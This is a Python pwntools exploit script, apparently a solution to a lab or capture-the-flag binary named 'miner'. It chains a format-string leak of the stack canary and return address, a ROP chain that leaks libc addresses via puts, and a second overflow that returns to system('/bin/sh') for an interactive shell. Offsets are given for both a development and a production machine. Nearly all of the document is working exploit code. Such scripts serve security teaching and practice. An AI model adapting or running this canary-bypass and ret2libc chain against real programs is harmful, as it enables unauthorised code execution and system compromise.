from pwn import *

context.terminal = ('xfce4-terminal', '-e')
pty = process.PTY

p = process("./miner", stdin=pty, stdout=pty)

# offset, found by looking at the disassembly and some trial and error
# Canary: %27$p
# Return Address: %29%p

# Plan
# 1. leak canary
# 2. leak return address
# 3. From these values, obtain addresses for main code segment
# 4. Overflow in troll room: return to a ROP chain that prints out the
libc addresses, then return to somewhere in the code to call
getCommand again.
# 5. Overflow again and return to libc and call system

# Offsets
return_address_offset = 0x1494 # Second call to getCommand in main
puts_plt_offset = 0x1050
puts_got_offset = 0x4028
printf_got_offset = 0x4040
ret_offset = 0x1016
endOfGetCommand_offset = 0x13d7

pop_rdi_offset = 0x15cb
pop_r14_r15_offset = 0x15c8
main_offset = 0x13d9

p.readuntil("Will you enter? (yes/no):")
p.sendline("yes%27$p")
p.readuntil("yes")
canary = int(p.recvline(), 16)
p.readuntil("Which way will you go? (right, left, down):")
p.sendline("right%29$p")
p.readuntil("right")
return_address = int(p.recvline(), 16)

print("Canary: " + hex(canary))
print("Return address: " + hex(return_address))

code_base = return_address - return_address_offset
print("Code base: " + hex(code_base))

pop_rdi = p64(code_base + pop_rdi_offset)
pop_r14_r15 = p64(code_base + pop_r14_r15_offset)
main = p64(code_base + main_offset)
puts_plt = p64(code_base + puts_plt_offset)
puts_got = p64(code_base + puts_got_offset)
printf_got = p64(code_base + printf_got_offset)
ret = p64(code_base + ret_offset)
end_of_get_command = code_base + endOfGetCommand_offset

junk = p64(0xdeadbeef)
sevens = p64(0x700000007)

# Complication:
# The main stack frame has the local variables for the valid cmds
# 0x7fffffffdda0: 0x00000000 0x00000002 0x00000000 0x00000001
# 0x7fffffffddb0: 0xffffffff 0x00000006 0x00000007 0xffffffff
# 0x7fffffffddc0: 0x00000002 0x00000003 0x00000004 0xffffffff
# These are just after the return address in getCommand
# In order for the getCommand function to exit properly, it needs to
match one of these.
# We will use command "run" which is command number 7
# So we can put 0xdeadbeef 0xdeadbeef 0x700000007 0x700000007 rest of
rop chain to avoid corruption
# however this still has to be a valid rop chain
# so replace 0xdeadbeef x 2 with two 64 bit values (normal rop chain)
# two 0x70000007's and pop them both off into garbage

offset = 104
payload = b"run" + b"A"*(offset-3) + p64(canary) + junk

rop = b""
rop += ret # kill one rop location
rop += pop_r14_r15 + sevens + sevens # overwrite the array with valid
content
# now on with the rop chain
rop += pop_rdi + puts_got + puts_plt
rop += pop_rdi + printf_got + puts_plt
# Need to return somewhere to do this over again...
rop += main

p.sendline(payload + rop)
p.readuntil("You chose")
p.readline()
puts_libc = u64(p.recv(6).ljust(8, b"\x00"))
p.recv(1)
printf_libc = u64(p.recv(6).ljust(8, b"\x00"))

print(hex(puts_libc))
print(hex(printf_libc))

# development machine - adjust for production
offset_system = 0x00000000000488a0
offset_str_bin_sh = 0x1881ac

offset_puts = 0x0000000000076030
# production machine
# could not get libc-database to work on the machine for this - had to
do it the old fashioned way. but that's fine too, just adds a little
extra challenge. It's covered in the lab...
offset_system = 0x0000000000048e20
offset_str_bin_sh = 0x18a143
offset_puts = 0x00000000000765b0
libc_base = puts_libc - offset_puts
system = p64(libc_base + offset_system)
bin_sh = p64(libc_base + offset_str_bin_sh)
# If things go as planned, we should get the leaks and go back to main
and have to start over again.
p.readuntil("Will you enter? (yes/no):")
p.sendline("yes")
p.readuntil("Which way will you go? (right, left, down):")
p.sendline("right")
p.readuntil("What will you do? (attack, run):")
rop = b""
rop += pop_rdi + bin_sh + system
#gdb.attach(p, '''
# break *''' + hex(end_of_get_command) + '''
# continue
# ''')
p.sendline(payload + rop)
p.interactive()

